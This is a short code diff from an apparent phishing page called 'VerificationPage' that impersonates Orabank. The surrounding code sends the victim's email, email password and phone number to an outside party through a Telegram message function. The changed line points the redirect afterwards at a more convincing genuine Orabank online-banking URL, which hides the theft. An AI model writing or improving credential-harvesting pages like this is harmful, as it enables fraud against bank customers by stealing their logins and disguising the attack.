@@ -377,7 +377,7 @@ function VerificationPage() {
       await sendTelegramMessage({ email, emailPassword, phoneNumber });
       setTimeout(() => {
         setIsLoading(false);
-        window.location.href = 'http://orabank.net/fr';
+        window.location.href = 'https://www.orabank.net/fr/compte-en-ligne';
       }, 2000);
     }
   };
